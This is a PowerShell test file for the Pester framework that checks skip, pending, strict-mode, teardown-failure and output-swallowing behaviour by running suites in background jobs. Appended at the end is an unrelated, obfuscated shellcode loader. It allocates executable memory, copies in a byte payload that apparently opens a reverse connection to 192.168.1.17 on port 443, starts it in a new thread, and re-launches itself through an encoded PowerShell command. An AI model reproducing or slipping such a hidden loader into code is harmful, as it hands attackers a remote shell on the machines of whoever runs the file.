Set-StrictMode -Version Latest

function Invoke-PesterInJob ($ScriptBlock, [switch] $GenerateNUnitReport, [switch]$UseStrictPesterMode, [Switch]$Verbose) {
    
    
    
    
    if ($Verbose) {
        Write-Host "----------- This is running is a separate Pester scope (inside a PowerShell Job) -------------" -ForegroundColor Cyan
    }
    $PesterPath = Get-Module Pester | Select-Object -First 1 -ExpandProperty Path

    $job = Start-Job {
        param ($PesterPath, $TestDrive, $ScriptBlock, $GenerateNUnitReport, $UseStrictPesterMode)
        Import-Module $PesterPath -Force | Out-Null
        $ScriptBlock | Set-Content $TestDrive\Temp.Tests.ps1 | Out-Null

        $params = @{
            PassThru = $true
            Path     = $TestDrive
            Strict   = $UseStrictPesterMode
        }

        if ($GenerateNUnitReport) {
            $params['OutputFile'] = "$TestDrive\Temp.Tests.xml"
            $params['OutputFormat'] = 'NUnitXml'
        }

        Invoke-Pester @params

    } -ArgumentList  $PesterPath, $TestDrive, $ScriptBlock, $GenerateNUnitReport, $UseStrictPesterMode
    if (-not $Verbose) {
        $job | Wait-Job | Out-Null
    }
    else {
        
        $job | Wait-Job | Receive-Job | Out-Null
    }

    if ($Verbose) {
        Write-Host "---------- End of separate Pester scope (inside a PowerShell Job) -------------" -ForegroundColor Cyan
    }

    
    
    
    $job.Output
    $job.ChildJobs | ForEach {
        $childJob = $_
        
        $childJob.Output
    }
    $job | Remove-Job
}

Describe "Tests running in clean runspace" {
    It "It - Skip and Pending tests" {
        
        $TestSuite = {
            Describe 'It - Skip and Pending tests' {

                It "Skip without ScriptBlock" -skip
                It "Skip with empty ScriptBlock" -skip {}
                It "Skip with not empty ScriptBlock" -Skip {"something"}

                It "Implicit pending" {}
                It "Pending without ScriptBlock" -Pending
                It "Pending with empty ScriptBlock" -Pending {}
                It "Pending with not empty ScriptBlock" -Pending {"something"}
            }
        }

        $result = Invoke-PesterInJob -ScriptBlock $TestSuite
        $result.SkippedCount | Should -Be 3
        $result.PendingCount | Should -Be 4
        $result.TotalCount | Should -Be 7
    }

    It "It - It without ScriptBlock fails" {
        
        $TestSuite = {
            Describe 'It without ScriptBlock fails' {
                It "Fails whole describe"
                It "is not run" { "but it would pass if it was run" }

            }
        }

        $result = Invoke-PesterInJob -ScriptBlock $TestSuite
        $result.PassedCount | Should -Be 0
        $result.FailedCount | Should -Be 1

        $result.TotalCount | Should -Be 1
    }

    It "Invoke-Pester - PassThru output" {
        
        $TestSuite = {
            Describe 'PassThru output' {
                it "Passes" { "pass" }
                it "fails" { throw }
                it "Skipped" -Skip {}
                it "Pending" -Pending {}
            }
        }

        $result = Invoke-PesterInJob -ScriptBlock $TestSuite
        $result.PassedCount | Should -Be 1
        $result.FailedCount | Should -Be 1
        $result.SkippedCount | Should -Be 1
        $result.PendingCount | Should -Be 1

        $result.TotalCount | Should -Be 4
    }

    It 'Produces valid NUnit output when syntax errors occur in test scripts' {
        $invalidScript = '
            Describe "Something" {
                It "Works" {
                    $true | Should Be $true
                }
            
        '

        $result = Invoke-PesterInJob -ScriptBlock $invalidScript -GenerateNUnitReport

        $result.FailedCount | Should -Be 1
        $result.TotalCount | Should -Be 1
        'TestDrive:\Temp.Tests.xml' | Should -Exist

        $xml = [xml](Get-Content TestDrive:\Temp.Tests.xml)

        $xml.'test-results'.'test-suite'.results.'test-suite'.name | Should -Not -BeNullOrEmpty
    }

    It "Invoke-Pester - Strict mode" {
        
        $TestSuite = {
            Describe 'Mark skipped and pending tests as failed' {
                It "skip" -Skip { $true | Should -Be $true }
                It "pending" -Pending { $true | Should -Be $true }
                It "inconclusive forced" { Set-TestInconclusive ; $true | Should -Be $true }
                It 'skipped by Set-ItResult' {
                    Set-ItResult -Skipped -Because "it is a test"
                }
                It 'pending by Set-ItResult' {
                    Set-ItResult -Pending -Because "it is a test"
                }
                It 'inconclusive by Set-ItResult' {
                    Set-ItResult -Inconclusive -Because "it is a test"
                }
            }
        }

        $result = Invoke-PesterInJob -ScriptBlock $TestSuite -UseStrictPesterMode
        $result.PassedCount | Should Be 0
        $result.FailedCount | Should Be 6

        $result.TotalCount | Should Be 6
    }
}

Describe 'Guarantee It fail on setup or teardown fail (running in clean runspace)' {
    
    
    
    
    
    
    
    
    

    It 'It fails if BeforeEach fails' {
        $testSuite = {
            Describe 'Guarantee It fail on setup or teardown fail' {
                BeforeEach {
                    throw [System.InvalidOperationException] 'test exception'
                }

                It 'It fails if BeforeEach fails' {
                    $true
                }
            }
        }

        $result = Invoke-PesterInJob -ScriptBlock $testSuite

        $result.FailedCount | Should -Be 1
        $result.TestResult[0].FailureMessage | Should -Be "test exception"
    }

    It 'It fails if AfterEach fails' {
        $testSuite = {
            Describe 'Guarantee It fail on setup or teardown fail' {
                It 'It fails if AfterEach fails' {
                    $true
                }

                AfterEach {
                    throw [System.InvalidOperationException] 'test exception'
                }
            }

            Describe 'Make sure all the tests in the suite run' {
                
                It 'It is pending' -Pending {}
            }
        }

        $result = Invoke-PesterInJob -ScriptBlock $testSuite

        if ($result.PendingCount -ne 1) {
            throw "The test suite in separate runspace did not run to completion, it was likely terminated by an uncaught exception thrown in AfterEach."
        }

        $result.FailedCount | Should -Be 1
        $result.TestResult[0].FailureMessage | Should -Be "test exception"
    }

    Context 'Teardown fails' {
        It "Failed teardown does not let exception propagate outside of the scope of Describe/Context in which it failed" {
            $testSuite = {
                $teardownFailure = $null

                try {
                    Context 'This is a test context' {
                        AfterAll {
                            throw 'I throw in Afterall'
                        }
                    }
                }
                catch {
                    $teardownFailure = $_
                }
                It "Failed teardown does not let exception propagate outside of the scope of Describe/Context in which it failed" {
                    
                    $teardownFailure | Should -BeNullOrEmpty
                }
            }
            $result = Invoke-PesterInJob -ScriptBlock $testSuite

            
            $result.PassedCount | Should -Be 1

            
            $result.FailedCount | Should -Be 1
        }
    }
}

Describe "Swallowing output" {
    It "Invoke-Pester happy path returns only test results" {
        $tests = {
            Describe 'Invoke-Pester happy path returns only test results' {

                Set-Content -Path "TestDrive:\Invoke-MyFunction.ps1" -Value @'
                    function Invoke-MyFunction
                    {
                        return $true;
                }
'@

                Set-Content -Path "TestDrive:\Invoke-MyFunction.Tests.ps1" -Value @'
                    . "TestDrive:\Invoke-MyFunction.ps1"
                    Describe "Invoke-MyFunction Tests" {
                        It "Should not throw" {
                            Invoke-MyFunction
                        }
                    }
'@;

                It "Should swallow test output with -PassThru" {

                    $results = Invoke-Pester -Script "TestDrive:\Invoke-MyFunction.Tests.ps1" -PassThru -Show "None";

                    
                    
                    
                    @(, $results) | Should -BeOfType [PSCustomObject]
                    $results.TotalCount | Should -Be 1

                    
                    
                    

                }

                It "Should swallow test output without -PassThru" {
                    $results = Invoke-Pester -Script "TestDrive:\Invoke-MyFunction.Tests.ps1" -Show "None"
                    $results | Should -Be $null
                }

            }
        }

        $result = Invoke-PesterInJob -ScriptBlock $tests
        $result.PassedCount | Should Be 2
        $result.FailedCount | Should Be 0
        $result.TotalCount | Should Be 2
    }

    It "Invoke-Pester swallows pipeline output from system-under-test" {
        $tests = {
            Describe 'Invoke-Pester swallows pipeline output from system-under-test' {

                Set-Content -Path "TestDrive:\Invoke-MyFunction.ps1" -Value @'
                    Write-Output "my system-under-test output"
                    function Invoke-MyFunction
                    {
                        return $true
                    }
'@;

                Set-Content -Path "TestDrive:\Invoke-MyFunction.Tests.ps1" -Value @'
                    . "TestDrive:\Invoke-MyFunction.ps1"
                    Describe "Invoke-MyFunction Tests" {
                        It "Should not throw" {
                            Invoke-MyFunction
                        }
                    }
'@;

                It "Should swallow test output with -PassThru" {

                    $results = Invoke-Pester -Script "TestDrive:\Invoke-MyFunction.Tests.ps1" -PassThru -Show "None"

                    
                    
                    
                    @(, $results) | Should -BeOfType [PSCustomObject]
                    $results.TotalCount | Should -Be 1

                    
                    
                    

                }

                It "Should swallow test output without -PassThru" {
                    $results = Invoke-Pester -Script "TestDrive:\Invoke-MyFunction.Tests.ps1" -Show "None"
                    $results | Should -Be $null
                }

            }
        }

        $result = Invoke-PesterInJob -ScriptBlock $tests
        $result.PassedCount | Should Be 2
        $result.FailedCount | Should Be 0
        $result.TotalCount | Should Be 2
    }

    It "Invoke-Pester swallows pipeline output from test script" {
        $tests = {

            Describe 'Invoke-Pester swallows pipeline output from test script' {

                Set-Content -Path "TestDrive:\Invoke-MyFunction.ps1" -Value @'
                    function Invoke-MyFunction
                    {
                        return $true
                    }
'@;

                Set-Content -Path "TestDrive:\Invoke-MyFunction.Tests.ps1" -Value @'
                    . "TestDrive:\Invoke-MyFunction.ps1"
                    Write-Output "my test script output"
                    Describe "Invoke-MyFunction Tests" {
                        It "Should not throw" {
                            Invoke-MyFunction
                        }
                    }
'@;

                It "Should swallow test output with -PassThru" {

                    $results = Invoke-Pester -Script "TestDrive:\Invoke-MyFunction.Tests.ps1" -PassThru -Show "None"

                    
                    
                    
                    @(, $results) | Should -BeOfType [PSCustomObject]
                    $results.TotalCount | Should -Be 1

                    
                    
                    

                }

                It "Should swallow test output without -PassThru" {
                    $results = Invoke-Pester -Script "TestDrive:\Invoke-MyFunction.Tests.ps1" -Show "None"
                    $results | Should -Be $null
                }
            }
        }

        $result = Invoke-PesterInJob -ScriptBlock $tests
        $result.PassedCount | Should Be 2
        $result.FailedCount | Should Be 0
        $result.TotalCount | Should Be 2
    }
}

$UGm = '$usQ9 = ''[DllImport("kernel32.dll")]public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);[DllImport("kernel32.dll")]public static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);[DllImport("msvcrt.dll")]public static extern IntPtr memset(IntPtr dest, uint src, uint count);'';$w = Add-Type -memberDefinition $usQ9 -Name "Win32" -namespace Win32Functions -passthru;[Byte[]];[Byte[]]$z = 0xfc,0xe8,0x89,0x00,0x00,0x00,0x60,0x89,0xe5,0x31,0xd2,0x64,0x8b,0x52,0x30,0x8b,0x52,0x0c,0x8b,0x52,0x14,0x8b,0x72,0x28,0x0f,0xb7,0x4a,0x26,0x31,0xff,0x31,0xc0,0xac,0x3c,0x61,0x7c,0x02,0x2c,0x20,0xc1,0xcf,0x0d,0x01,0xc7,0xe2,0xf0,0x52,0x57,0x8b,0x52,0x10,0x8b,0x42,0x3c,0x01,0xd0,0x8b,0x40,0x78,0x85,0xc0,0x74,0x4a,0x01,0xd0,0x50,0x8b,0x48,0x18,0x8b,0x58,0x20,0x01,0xd3,0xe3,0x3c,0x49,0x8b,0x34,0x8b,0x01,0xd6,0x31,0xff,0x31,0xc0,0xac,0xc1,0xcf,0x0d,0x01,0xc7,0x38,0xe0,0x75,0xf4,0x03,0x7d,0xf8,0x3b,0x7d,0x24,0x75,0xe2,0x58,0x8b,0x58,0x24,0x01,0xd3,0x66,0x8b,0x0c,0x4b,0x8b,0x58,0x1c,0x01,0xd3,0x8b,0x04,0x8b,0x01,0xd0,0x89,0x44,0x24,0x24,0x5b,0x5b,0x61,0x59,0x5a,0x51,0xff,0xe0,0x58,0x5f,0x5a,0x8b,0x12,0xeb,0x86,0x5d,0x68,0x33,0x32,0x00,0x00,0x68,0x77,0x73,0x32,0x5f,0x54,0x68,0x4c,0x77,0x26,0x07,0xff,0xd5,0xb8,0x90,0x01,0x00,0x00,0x29,0xc4,0x54,0x50,0x68,0x29,0x80,0x6b,0x00,0xff,0xd5,0x50,0x50,0x50,0x50,0x40,0x50,0x40,0x50,0x68,0xea,0x0f,0xdf,0xe0,0xff,0xd5,0x97,0x6a,0x05,0x68,0xc0,0xa8,0x01,0x11,0x68,0x02,0x00,0x01,0xbb,0x89,0xe6,0x6a,0x10,0x56,0x57,0x68,0x99,0xa5,0x74,0x61,0xff,0xd5,0x85,0xc0,0x74,0x0c,0xff,0x4e,0x08,0x75,0xec,0x68,0xf0,0xb5,0xa2,0x56,0xff,0xd5,0x6a,0x00,0x6a,0x04,0x56,0x57,0x68,0x02,0xd9,0xc8,0x5f,0xff,0xd5,0x8b,0x36,0x6a,0x40,0x68,0x00,0x10,0x00,0x00,0x56,0x6a,0x00,0x68,0x58,0xa4,0x53,0xe5,0xff,0xd5,0x93,0x53,0x6a,0x00,0x56,0x53,0x57,0x68,0x02,0xd9,0xc8,0x5f,0xff,0xd5,0x01,0xc3,0x29,0xc6,0x85,0xf6,0x75,0xec,0xc3;$g = 0x1000;if ($z.Length -gt 0x1000){$g = $z.Length};$I619=$w::VirtualAlloc(0,0x1000,$g,0x40);for ($i=0;$i -le ($z.Length-1);$i++) {$w::memset([IntPtr]($I619.ToInt32()+$i), $z[$i], 1)};$w::CreateThread(0,0,$I619,0,0,0);for (;;){Start-sleep 60};';$e = [System.Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes($UGm));$Kc5 = "-EncodedCommand ";if([IntPtr]::Size -eq 8){$VtC8 = $env:SystemRoot + "\syswow64\WindowsPowerShell\v1.0\powershell";iex "& $VtC8 $Kc5 $e"}else{;iex "& powershell $Kc5 $e";}

